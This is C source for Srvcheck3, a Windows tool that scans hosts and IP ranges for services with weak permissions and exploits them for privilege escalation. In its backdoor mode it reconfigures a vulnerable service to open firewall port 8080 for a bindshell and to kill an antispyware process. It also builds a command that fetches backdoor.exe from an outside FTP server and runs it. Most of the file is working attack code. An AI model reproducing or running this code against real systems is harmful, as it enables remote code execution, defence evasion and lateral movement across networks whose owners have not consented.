/*
 * Privilege Scalation for Windows Networks using weak Service restrictions v3.0
 * (c) 2008 Andres Tarasco Acu�a ( atarasco _at_ gmail.com )
*/
#define _CRT_SECURE_NO_DEPRECATE 
#include <stdio.h>
#include <windows.h>

#pragma comment(lib, "Mpr.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wininet.lib")

#define HOST_LOCAL 0
#define HOST_SINGLE 1
#define HOST_RANGE  2
#define HOST_FILE	3
#define CONNECT_TIMEOUT  10

char antispyware[]="taskkill.exe  /IM gcasDtServ.exe";
char firewall[]="cmd.exe /c netsh firewall add portopening TCP 8080 SrvCheck ENABLE ALL";

BYTE LIST=0;
BYTE BACKDOOR=1;
BYTE STOP=0;

char RemoteHost[256];  //sigle host
FILE *hostsfile=NULL; //host file
extern unsigned long currentip=0; //host range
extern unsigned long endip=0; //host range
char permission[256];

DWORD LISTMETHOD=HOST_LOCAL;

int vHosts=0; //Vulnerable hosts
int nHosts=0; //number of hosts


//Functions
void doFormatMessage( unsigned int dwLastErr );
void usage(int HELP);
DWORD StartModifiedService(SC_HANDLE SCM, char *srv, BOOL dbg);
void ListVulnerableService(char *host);
void TaskListServices(char *host,char *user,char *pass);
char *GetOwner(char *servicio);
DWORD CheckIfHostIsAlive(char *host, char *fqdn);
char *GenerateFTPTransfer(char *host, char *port, char *username, char *password, char *downloadfile,char *optionalparameter);

/******************************************************************************/

void DumpMem(void* string, int length) {
#define DBG_DUMP_ROWS 16
    unsigned char *p = (unsigned char *) string;
    unsigned char lastrow_data[16];
    int rows = length / DBG_DUMP_ROWS;
    int lastrow = length % DBG_DUMP_ROWS;
    int i, j;

    for (i = 0; i < rows; i++) {
        printf("%04hx: ", i * 16);
        for (j = 0; j < DBG_DUMP_ROWS; j++) {
            printf("%02x ", p[(i * 16) + j]);
            if ((j % 8 == 1) && (j!=1) ) {
                printf(" ");
            }
        }
        printf(" [ ");
        for (j = 0; j < DBG_DUMP_ROWS; j++) {
            if (isprint(p[(i * 16) + j]))
                printf("%c", p[(i * 16) + j]);
            else
                printf(".");
        }
        printf(" ]\n");
    }
    if (lastrow > 0) {
        memset(lastrow_data, 0, sizeof(lastrow_data));
        memcpy(lastrow_data, p + length - lastrow, lastrow);
        printf("%04hx: ", i * 16);
        for (j = 0; j < lastrow; j++) {
            printf("%02x ", p[(i * 16) + j]);
            if ( (j % 8 == 1) && (j!=1) )
                printf(" ");
        }
        while(j < DBG_DUMP_ROWS) {
            printf(" ");
            if (j % 8 == 1)
                printf(" ");
            j++;
        }
        printf(" [ ");
        for (j = 0; j < lastrow; j++) {
            if (isprint(p[(i * 16) + j]))
                printf("%c", p[(i * 16) + j]);
            else
                printf(".");
        }
        while(j < DBG_DUMP_ROWS) {
            printf(" ");
            j++;
        }
        printf(" ]\n");
    }

}

DWORD CheckIfHostIsAlive(char *host, char *fqdn)
{
   char req1[] =
      "\x00\x00\x00\x85\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x18\x53\xc8"
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe"
      "\x00\x00\x00\x00\x00\x62\x00\x02\x50\x43\x20\x4e\x45\x54\x57\x4f"
      "\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31\x2e\x30\x00\x02"
      "\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00\x02\x57\x69\x6e\x64\x6f"
      "\x77\x73\x20\x66\x6f\x72\x20\x57\x6f\x72\x6b\x67\x72\x6f\x75\x70"
      "\x73\x20\x33\x2e\x31\x61\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30"
      "\x32\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54"
      "\x20\x4c\x4d\x20\x30\x2e\x31\x32";
   char req2[] =
      "\x00\x00\x00\xa4\xff\x53\x4d\x42\x73\x00\x00\x00\x00\x18\x07\xc8"
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe"
      "\x00\x00\x10\x00\x0c\xff\x00\xa4\x00\x04\x11\x0a\x00\x00\x00\x00"
      "\x00\x00\x00\x20\x00\x00\x00\x00\x00\xd4\x00\x00\x80\x69\x00\x4e"
      "\x54\x4c\x4d\x53\x53\x50\x00\x01\x00\x00\x00\x97\x82\x08\xe0\x00"
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
      "\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00"
      "\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00\x32\x00\x31\x00\x39\x00"
      "\x35\x00\x00\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00"
      "\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00\x35\x00"
      "\x2e\x00\x30\x00\x00\x00\x00";
   
   WSADATA ws;   
   int sock;
   struct sockaddr_in remote;   
   unsigned char buf[0x300];
   int i;
   OSVERSIONINFO os;
   u_long tmp=1;
   fd_set fds;
   struct timeval tv;
   struct hostent *hostend;

   printf("[+] Checking if remote host is alive...\n");

   //NetWkstaGetInfo 
   remote.sin_family = AF_INET;
   remote.sin_addr.s_addr = inet_addr(host);
   if (remote.sin_addr.s_addr == INADDR_NONE)
   {
	   hostend=gethostbyname(host);
	   if (!hostend) 
	   {
		   printf("[-] Unable to resolve %s\n",host);
		   return(0);
	   }
	   memcpy(&remote.sin_addr.s_addr, hostend->h_addr, 4);	   
   }
   printf("[+] Host %s  resolved as %s\n",host,inet_ntoa(remote.sin_addr));
   remote.sin_port = htons(445);	  
   sock=socket(AF_INET, SOCK_STREAM, 0);
   
  
   ioctlsocket( sock, FIONBIO, &tmp);
   tv.tv_sec = CONNECT_TIMEOUT;
   tv.tv_usec = 0;
   FD_ZERO(&fds);
   FD_SET(sock, &fds);
   
//   if (connect(sock,(struct sockaddr *)&remote, sizeof(remote))>=0) {
   connect(sock,(struct sockaddr *)&remote, sizeof(remote));
   if((select(sock+1,0,&fds,0,&tv))>0){
	   tmp=0;
	   ioctlsocket( sock, FIONBIO, &tmp);
      if (send(sock, req1, sizeof(req1),0) >0) {
         if (i=recv(sock, buf, sizeof (buf), 0) > 0) {
			 //DumpMem(buf,i);
            if (send(sock, req2, sizeof(req2),0) >0) {
				memset(buf,'\0',sizeof(buf));
               i=recv(sock, buf, sizeof (buf), 0);
               if (i>0) {
				   
				   WORD DataSize=0;
				   wchar_t* version;

//				   printf("leidos: %i bytes\n",i); fflush(stdout);
//				   DumpMem(buf,i);

				   memcpy((char*)&DataSize,buf+0x2B,2);
				   //printf("Data Size: %i: %2.2x %2.2x\n",DataSize,buf[0x2B],buf[0x2C]);
				   version=(wchar_t*)&buf[0x2b+DataSize +4+1];
//				   DumpMem((char*)version,i-(+0x2b+DataSize +4));
				   printf("[+] version:  %S\n",version);
				   printf("[+] version2: %S\n",version+wcslen(version)+1);

				   
				   printf("[+] Remote OS Fingerprint (%2.2x.%2.2x)\n",buf[0x60-1], buf[0x60]);
				   return(buf[0x60-1]);
				   if (fqdn) { //extract fqdn name from rpc packet
					   char *p=buf+0x67;
					   WORD len;
					   
					   while(memcmp(p,"\x04\x00",2)!=0) p+=2;				   
					   p+=2;
					   memcpy((char*)&len,p,2);
//					   printf("longitud: %i bytes\n",len);
					   memcpy((char*)fqdn,p+2,len);
					   printf("[+] Fqdn name obtained from netbios packet: %S\n",fqdn);fflush(stdout);
				   }

                  
				  return(buf[0x60-1]);
				  /*

                  if (buf[0x60-1]==5) {
                     return(buf[0x60]);
                  } else {
                     printf("\n[-] Unssuported OS\n");
                  }
				  */
               } else {
                  printf("[-] Recv2 failed\n");
               }
            } else {
               printf("[-] Send2 failed\n");
            }
         } else {
            printf("[-] Recv failed\n");
         }
      } else {
         printf("[-] Send failed\n");
      }
   } else {
      printf("[-] Connect failed\n");
   }
   return(0);
}



char *GenerateFTPTransfer(char *host, char *port, char *username, char *password, char *downloadfile,char *optionalparameter)
{
char *buffer=malloc(4096);
char tmp[256];
char path[256];
char fullpath[100];
int random=0;

srand(time(0));
random=rand();
sprintf(path,"\\%i",random);
srand(random);
random=rand();
sprintf(fullpath,"%s\\%i",path,"random");
sprintf(tmp,"cmd.exe /c md %s",path);
strcpy(buffer,tmp);
sprintf(tmp,"&& echo o %s %s>%s",host, port,fullpath);
strcat(buffer,tmp);
sprintf(tmp,"&& echo %s>>%s",username,fullpath);
strcat(buffer,tmp);
sprintf(tmp,"&& echo %s>>%s",password,fullpath);
strcat(buffer,tmp);
sprintf(tmp,"&& echo USER %s>>%s",username,fullpath); //try password twice
strcat(buffer,tmp);
sprintf(tmp,"&& echo %s>>%s",password,fullpath);
strcat(buffer,tmp);
sprintf(tmp,"&& echo bin>>%s",fullpath);
strcat(buffer,tmp);
sprintf(tmp,"&& echo lcd %s>>%s",path,fullpath);
strcat(buffer,tmp);
sprintf(tmp,"&& echo bin>>%s",fullpath);
strcat(buffer,tmp);
sprintf(tmp,"&& echo GET %s>>%s",downloadfile,fullpath);
strcat(buffer,tmp);
sprintf(tmp,"&& echo bye>>%s",fullpath);
strcat(buffer,tmp);
sprintf(tmp,"&& ftp -s:%s",fullpath);
strcat(buffer,tmp);
if (optionalparameter) {
	sprintf(tmp,"&& %s\\%s %s",path,downloadfile,optionalparameter);
} else {
	sprintf(tmp,"&& %s\\%s",path,downloadfile);
}
strcat(buffer,tmp);

return(buffer);
}


DWORD ConnectToHost(char *host, char *user, char *pass)
{
	 NETRESOURCE NET;
	 DWORD ret;
	 char CurrentUserName[256];
	 char fqdn[256];
     printf("\n[+] Trying to connect to remote SCM\n");
     sprintf(RemoteHost,"\\\\%s\\IPC$",host);
     printf("[+] Host: %s\n",RemoteHost);
     printf("[+] Username: %s\n",user);
     printf("[+] Password: %s\n",pass);
	 memset(fqdn,'\0',sizeof(fqdn));

	 ret=CheckIfHostIsAlive(host,fqdn);
	 if (!ret) return(0);

    NET.dwType = RESOURCETYPE_ANY;
    NET.lpProvider = NULL;
    NET.lpLocalName=NULL;
    NET.lpRemoteName = (char *)RemoteHost;
    ret=WNetAddConnection2(&NET,pass,user,CONNECT_COMMANDLINE);//CONNECT_PROMPT);//CONNECT_UPDATE_PROFILE);

    //verificaci�n de errores de conexi�n...
    if ( (ret!=NO_ERROR) && (user !=NULL) ) {
		switch(ret) {
			case 1219: //connection already created. Disconnecting..
				printf("[-] Credentials mismatch. Removing old connection\n"); 
				WNetCancelConnection2(RemoteHost,0,TRUE);
				ret=WNetAddConnection2(&NET,pass,user,CONNECT_UPDATE_PROFILE);
				break;
			case 1326: //usuario o contrase�a incorrecta
				if (strchr(user,'\\')==NULL) {
					sprintf(CurrentUserName,"localhost\\%s",user);
					printf("[-] Unknown Username or password\n");
					printf("[+] Trying \"%s\" as new username\n",CurrentUserName);
					ret=WNetAddConnection2(&NET,pass,CurrentUserName,CONNECT_UPDATE_PROFILE);
				}
				break;	 		
			default:
				return(0);
		}
		if (ret!=NO_ERROR) {
            printf("[-] WNetAddConnection Failed to %s (%s/ %s)\n",RemoteHost,user,pass);
            doFormatMessage(GetLastError());
            return(0);
        }
	}
	printf("[+] Network Connection OK\n");
	return(1);

}

int main(int argc, char* argv[]) {

 SC_HANDLE SCM,Svc;
 DWORD len; 
 DWORD ret;
 char *newPath=NULL;
 char *host=NULL;
 char *user=NULL;
 char *pass=NULL;
 char *srv=NULL;
 int i;
 NETRESOURCE NET;
 SERVICE_STATUS_PROCESS StopStatus;
 char CurrentUserName[256];
 WSADATA ws;
 char *p;
 char fqdn[256];

 //backdoor
 char *myaddress="127.0.0.1";
 char *myport="21";
 char *ftpusername="a";
 char *ftppassword="a ";
 char *downloadfile="backdoor.exe";
 char *optionalparameter=NULL;

 printf(" Srvcheck 3 - Windows Services ACL permission Scanner\n");
 printf(" (c) 2006 - 2008 Andres Tarasco - atarasco%cgmail.com\n",'@');
 printf(" * PRIVATE BUILD for PENTESTERS - http://www.tarasco.org\n\n");


 if (argc==1) { usage(1); }


 if (WSAStartup( MAKEWORD(2,2), &ws )!=0) {
	printf(" [-] WSAStartup() Error\n");
    exit(0);
 }

 for (i=1;i<argc;i++) {
    if ( (strlen(argv[i])==2) && (argv[i][0]=='-') ) {
        switch (argv[i][1]) {
            case 'l': LIST=1; break;
            case 'm': srv=argv[i+1]; i=i+1;break;
			case 'u': user=argv[i+1]; i=i++; break;
            case 'p': pass=argv[i+1]; i=i++; break;
			case 'f': hostsfile=fopen(argv[i+1],"r"); 
					if (!hostsfile) { 
						printf("[-] Unable to open %s\n",argv[i+1]); 
						exit(1);
					} 
					i=i++; 
					LISTMETHOD=HOST_FILE;
					break;
            case 'H': 				
				p=strchr(argv[i+1],'-');
				if (!p){
					host=argv[i+1];
					LISTMETHOD=HOST_SINGLE;
				} else {
					struct sockaddr_in ip1,ip2;
					p=strtok(argv[i+1],"-");
					ip1.sin_addr.s_addr = inet_addr(p);
					currentip=ntohl(ip1.sin_addr.s_addr);
					p=strtok(NULL,"-");
					ip2.sin_addr.s_addr = inet_addr(p);
					endip=ntohl(ip2.sin_addr.s_addr);
					if (endip==currentip) endip++;
					if ( (endip-currentip)<0) {
                        printf("[-] Invalid host range %s  - %s\n",inet_ntoa(ip1.sin_addr),p);
                        usage(0);
					}
					LISTMETHOD=HOST_RANGE;
				}
				i=i++;
				break;
            case 'c': newPath=argv[i+1]; i=i+1; BACKDOOR=0; break;
            case 's': STOP=1; break;
			case 'r':
					myaddress=argv[i+1];
					myport=argv[i+2];
					downloadfile=argv[i+3];
					i+=3;
					break;
			case 'o':
				optionalparameter=argv[i+1];
				i++;
				break;

            case '?': usage(1); break;
            default: printf("Unknown Parameter: %s\n",argv[i]);usage(0); break;
        }
    }
 }


 if ((!LIST) && (!srv) )usage(1);

 if (LIST)
 {
	 TaskListServices(host,user,pass);
	 return(1);
 }

 if (host) ConnectToHost(host,user,pass);


//SERVICE HACKS HERE!!

//printf("lets goo..\n");fflush(stdout);exit(1);

SCM = OpenSCManager(host,NULL,STANDARD_RIGHTS_WRITE | SERVICE_START );
if (!SCM){
    printf("[-] Failed to Open ScManager\n");
    doFormatMessage(GetLastError());
    exit(-1);
}
Svc = OpenService(SCM,srv,SERVICE_CHANGE_CONFIG | STANDARD_RIGHTS_WRITE | SERVICE_STOP);
if (Svc){
	printf("[+] Stopping previously running instances...\n");
	do {
		ret=ControlService(Svc,SERVICE_CONTROL_STOP,(LPSERVICE_STATUS)&StopStatus);
		if (ret==0) break;
		ret=GetLastError();
		doFormatMessage(ret);
		if (ret==997) Sleep(500);	
	} while (ret==997);
 }
if (STOP) exit(1); //We just wanted to stop the remote service =)
STOP=1; //flag that we have stop permissions..

if (!Svc)
{
	printf("[-] Error calling to OpenService with Service_stop flag\n");
	Svc = OpenService(SCM,srv,SERVICE_CHANGE_CONFIG | STANDARD_RIGHTS_WRITE);
	if (!Svc)
	{
		printf("[-] Unable to open Service %s\n",srv);
		exit(1);
	}
}

 if (BACKDOOR) {
	 char *code;
    printf("[+] Granting Remote bindshell Execution..\n");
    ret=ChangeServiceConfig(
        Svc,SERVICE_NO_CHANGE,SERVICE_AUTO_START,
        SERVICE_ERROR_IGNORE,firewall,NULL,NULL,"",
        NULL,NULL,NULL);
        if (ret!=0) StartModifiedService(SCM,srv,0);
    printf("[+] Shutting down remote antispyware Service =)\n");
    ret=ChangeServiceConfig(
        Svc,SERVICE_NO_CHANGE,SERVICE_AUTO_START,
        SERVICE_ERROR_IGNORE,antispyware,NULL,NULL,"",
        NULL,NULL,NULL);
        if (ret!=0) StartModifiedService(SCM,srv,0);
    printf("[+] Installing Backdoor Code...\n");


	code=GenerateFTPTransfer(myaddress, myport, ftpusername, ftppassword, downloadfile,optionalparameter);
    ret=ChangeServiceConfig(
        Svc,SERVICE_NO_CHANGE,SERVICE_AUTO_START,
        SERVICE_ERROR_IGNORE,code,NULL,NULL,"",
        NULL,NULL,NULL);
 } else { //Ejecutando parametros especificados con -c

 SERVICE_FAILURE_ACTIONS failure; 
 SC_ACTION* lpsaActions=(SC_ACTION*)malloc(sizeof(SC_ACTION));

 failure.dwResetPeriod=1;
 failure.lpRebootMsg="";
 failure.lpCommand="cmd.exe /c c:\\backdoor.exe";
 failure.cActions=1;
 failure.lpsaActions=lpsaActions;

 lpsaActions->Type=SC_ACTION_RUN_COMMAND;
 lpsaActions->Delay=0;

	printf("[+] Sending custom commands to the service\n");
    ret=ChangeServiceConfig(
        Svc,SERVICE_NO_CHANGE,SERVICE_AUTO_START,
        SERVICE_ERROR_IGNORE,newPath,NULL,NULL,"",
        NULL,NULL,NULL);

	ChangeServiceConfig2(Svc,SERVICE_CONFIG_FAILURE_ACTIONS,&failure);

 }

 if (ret!=0) {
    printf("[+] The service have been succesfully modified =)\n");
    CloseServiceHandle(Svc);
    StartModifiedService(SCM,srv,1);
 } else {
    printf("[-] Service modification Failed\n");
    doFormatMessage(ret);
 }
 CloseServiceHandle(SCM);
 if (host) WNetCancelConnection2(RemoteHost,0,TRUE);
 return(1);
}

/******************************************************************************/
void doFormatMessage( unsigned int dwLastErr )  {
    LPVOID lpMsgBuf;
    FormatMessage(
        FORMAT_MESSAGE_ALLOCATE_BUFFER |
        FORMAT_MESSAGE_IGNORE_INSERTS |
        FORMAT_MESSAGE_FROM_SYSTEM,
        NULL,
        dwLastErr,
        MAKELANGID( LANG_NEUTRAL, SUBLANG_DEFAULT ),
        (LPTSTR) &lpMsgBuf,
        0,
        NULL );
    printf("[-] ErrorCode %i: %s", dwLastErr, lpMsgBuf);
    LocalFree( lpMsgBuf  );
}

/******************************************************************************/

DWORD StartModifiedService(SC_HANDLE SCM, char *srv, BOOL dbg) {

 SC_HANDLE Svc;
 DWORD Error;
 SERVICE_STATUS_PROCESS StartStatus;
 DWORD dwByteNeeded;

 DWORD dwOldCheckPoint;
 DWORD dwStartTickCount;
 DWORD dwWaitTime;


 Svc= OpenService( SCM, srv, SERVICE_ALL_ACCESS);

 if (Svc==NULL) {
    if (dbg) printf("[-] Unable to reopen service for starting..\n");
    return(-1);
 } else {
	 if (dbg) {
		 if (BACKDOOR) printf("[+] Service Opened... Try to connect to port 8080\n");
		 else printf("[+] Service Opened. Trying to Start... (wait a few seconds)\n");
	 }
 }

 if (!StartService(Svc,0,NULL)) {
    Error=GetLastError();
    if (Error==1053) {
        if (dbg) {
            printf("[+] StartService() Error due to a non service application execution\n");
            printf("[+] Ignore it. Your application should be executed =)\n");
            if (BACKDOOR) {
                printf("[+] Now connect to port 8080 and enjoy your new privileges\n");
            }
        }
    } else {
        if (dbg) {
            printf("[-] Unable to start Service :/\n");
            doFormatMessage(Error);
        }
        return(Error);
    }

 } else {
        if (dbg) printf("[+] Starting Service....\n");
        if (!QueryServiceStatusEx(
            Svc,             // handle to service
            SC_STATUS_PROCESS_INFO, // info level
            (LPBYTE)&StartStatus,              // address of structure
            sizeof(SERVICE_STATUS_PROCESS), // size of structure
            &dwByteNeeded) )              // if buffer too small
        {
            if (dbg) printf("[-] Unable to QueryServiceStatusEx() \n");
            return(-2);
        } else {

            //Revisi�n de si arranca el servicio..
            // Save the tick count and initial checkpoint.
            dwStartTickCount = GetTickCount();
            dwOldCheckPoint = StartStatus.dwCheckPoint;
            while (StartStatus.dwCurrentState == SERVICE_START_PENDING)
            {
                if (dbg) printf("Wait Time: %i\n",StartStatus.dwWaitHint);
                dwWaitTime = StartStatus.dwWaitHint  / 10;
                if( dwWaitTime < 1000 )
                    dwWaitTime = 1000;
                else if ( dwWaitTime > 10000 )
                    dwWaitTime = 10000;
                Sleep( dwWaitTime );
                // Check the status again.

                if (!QueryServiceStatusEx(
                    Svc,             // handle to service
                    SC_STATUS_PROCESS_INFO, // info level
                    (LPBYTE)&StartStatus,              // address of structure
                    sizeof(SERVICE_STATUS_PROCESS), // size of structure
                    &dwByteNeeded ) )              // if buffer too small
                {
                    if (dbg) printf("[-] Unable to QueryServiceStatusEx() \n");
                    return(-2);
                }
                if ( StartStatus.dwCheckPoint > dwOldCheckPoint )
                {
                // The service is making progress.
                    dwStartTickCount = GetTickCount();
                    dwOldCheckPoint = StartStatus.dwCheckPoint;
                } else {
                    if(GetTickCount()-dwStartTickCount > StartStatus.dwWaitHint)
                    {
                        // No progress made within the wait hint
                        if (dbg) printf("el servicio no se ha arrancado...\n");
                        break;
                    }
                }
            }
        }
        CloseServiceHandle(Svc);
        if (StartStatus.dwCurrentState == SERVICE_RUNNING)
        {
            if (dbg) printf("[+] StartService SUCCESS.\n");
            return 1;
        }
        else
        {
            if (dbg) printf("\n[-] Service not started. \n");
        }
  }
  return(0);
}


/******************************************************************************/
void usage(int HELP) {
    printf(" Available parameters for SrvCheck3:\n");
	printf(" -----------------------------------\n\n");
    
	printf(" Srvcheck3.exe -l [options]          List vulnerable services (locally or remotely)\n");
    printf("    -H Host|[ip1-ip2]                Specify a remote host/s to connect (netbiosname/ip(s))\n");
	printf("    -f file                          Specify a ip/host file to audit (for example net view >file.txt)\n");
	printf(" Srvcheck3.exe -m service -c command Executes a remote command running as service\n");
    printf(" Srvcheck3.exe -m service [options]  Executes backdoor or command for that service\n");
	printf("    -r ftphost ftpport backdoorfile  Download configuration)\n");
	printf("    [-o optionalparameter]           Additional parameter to be added to backdoorfile\n");
	printf(" You should also use always -u DOMAIN\\user and -p password flags unless running from a domain shell\n\n");

	if (HELP) {
     printf(" examples:\n");
	 printf("----------\n");
     printf(" Srvcheck3.exe -l (list local vulnerabilities)\n");
	 printf(" Srvcheck3.exe -l -H 192.168.1.1-192.168.1.255 -u domain\user -p domainpass \n");
	 printf(" Srvcheck3.exe -l -f hosts.txt -u DOMAIN\user -p password (list remote vulnerabilities)\n");
     printf(" Srvcheck3.exe -m service -H host -c \"cmd.exe /c md c:\\PWNED\"\n");
	 printf(" Srvcheck3.exe -m vulnservice -H 192.168.1.200 -u domain\user -p domainpass -r 192.168.1.1 21 backdoor.exe (executes backdoor.exe bindshell)\n");

   }
   exit(-1);
}


/******************************************************************************/
void ListVulnerableService(char *host) {
 SC_HANDLE SCM;
 SC_HANDLE Svc;
 DWORD nResumeHandle;
 DWORD dwServiceType;
 LPENUM_SERVICE_STATUS_PROCESS lpServices;
 DWORD nSize = 0;
 DWORD nServicesReturned;
 unsigned int n;
 unsigned int l=0;
 DWORD dwByteNeeded;
 LPQUERY_SERVICE_CONFIG lpConfig;
 char *p;

    SCM = OpenSCManager(host,NULL,SC_MANAGER_ENUMERATE_SERVICE);
    if (!SCM){
        printf("[-] OpenScManager() FAILED\n");
        doFormatMessage(GetLastError());
        return;
    }
    nResumeHandle = 0;
    dwServiceType = SERVICE_WIN32 | SERVICE_DRIVER;
    lpServices = (LPENUM_SERVICE_STATUS_PROCESS) LocalAlloc(LPTR, 65535);
    if (!lpServices) {
        printf("[-] CRITICAL ERROR: LocalAlloc() Failed\n");
        //exit(-1);
		return;
    }
    memset(lpServices,'\0',sizeof(lpServices));
    if (EnumServicesStatusEx(SCM, SC_ENUM_PROCESS_INFO,
        dwServiceType, SERVICE_STATE_ALL,
        (LPBYTE)lpServices, 65535,
        &nSize, &nServicesReturned,
        &nResumeHandle, NULL) == 0)
    {
        printf("EnumServicesStatusEx FAILED\n");
        return;//exit(-1);

    }

    printf("[+] Listing Vulnerable Services...\n");
    for (n = 0; n < nServicesReturned; n++) {
        Svc = OpenService(SCM,lpServices[n].lpServiceName, SERVICE_CHANGE_CONFIG | SC_MANAGER_ENUMERATE_SERVICE |GENERIC_READ);
        if (Svc!=NULL) {
            l++;
            printf("\n    [%s]\t\t%s\n",lpServices[n].lpServiceName, lpServices[n].lpDisplayName);
            printf("    Status: 0x%x\n",lpServices[n].ServiceStatusProcess.dwCurrentState);
            if (!host) {
                p=GetOwner(lpServices[n].lpServiceName);
                if (p) {
                    printf("    Context:\t\t%s\n",p);
                } 
            }
    		dwByteNeeded = 0;
		    lpConfig = (LPQUERY_SERVICE_CONFIG) LocalAlloc(LPTR, 1024*8);
		    if (QueryServiceConfig(Svc, lpConfig, 1024*8, &dwByteNeeded)!=0) {
                printf("    Parameter:\t\t%s\n",lpConfig->lpBinaryPathName);
            }else {
                doFormatMessage(GetLastError());
            }
        }
    }
    printf("\n[+] Analyzed %i Services in your system\n",nServicesReturned);
    if (l>0) {
		vHosts++;
        printf("[+] You were Lucky. %i vulnerable services found\n",l);
    }   else {
        printf("[+] Your system is secure! Great! :/\n");
    }
     if (host) WNetCancelConnection2(RemoteHost,0,TRUE);

    CloseServiceHandle(SCM);
    LocalFree(lpServices);
}

/*****************************************************************************/
void TaskListServices(char *host,char *user,char *pass)
{
 	char hostname[256];
	struct sockaddr_in remotehost;
	char *p;
	char *q;
	char tmp[256];

	switch(LISTMETHOD)
	{
	case HOST_SINGLE:
		if (!ConnectToHost(host,user,pass)) return;
	case HOST_LOCAL:	
		ListVulnerableService(host);
		break;
	case HOST_RANGE:		
		do {
			remotehost.sin_addr.s_addr=htonl(currentip);
			sprintf(hostname,"%s",inet_ntoa(remotehost.sin_addr));
			nHosts++;
			if (ConnectToHost(hostname,user,pass))
			{
				ListVulnerableService(hostname);
			}
			currentip++;
		} while (currentip!=endip);
		printf("[+] Scan Finished. %i vulnerable hosts (%i hosts analyzed)\n",vHosts,nHosts);
		break;
	case HOST_FILE:
		while (!feof(hostsfile)){
			memset(tmp,'\0',sizeof(tmp));
			fgets(tmp,sizeof(tmp)-1,hostsfile);
			if (strlen(tmp)>0) {				
				//tmp[strlen(tmp)-1]='\0';
				p=tmp;
				while ( (*p!='\0') && ( (*p=='\\') || (*p=='\\') || (*p==' ') || (*p=='\\')  ) ) p++;
				q=strstr(p," "); if (q) *q='\0';
				q=strstr(p,"\r"); if (q) *q='\0';
				q=strstr(p,"\n"); if (q) *q='\0';
				if (strlen(p)>0) 
				{
					nHosts++;
					if (ConnectToHost(p,user,pass))
					{
						ListVulnerableService(p);
					}
				}
			}
		}
		break;
	}
 }

char *GetOwner(char *servicio) {

 char path[256];
 HKEY hReg;
 DWORD len=sizeof(permission);

 sprintf(path,"SYSTEM\\CurrentControlSet\\Services\\%s",servicio);
 if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,path,0,KEY_QUERY_VALUE,&hReg)== ERROR_SUCCESS ) {
    if (RegQueryValueEx(hReg,"ObjectName",NULL,NULL,permission,&len)==ERROR_SUCCESS) {
        RegCloseKey(hReg);
        return(permission);
    }
    RegCloseKey(hReg);
 }
 return(NULL);
}





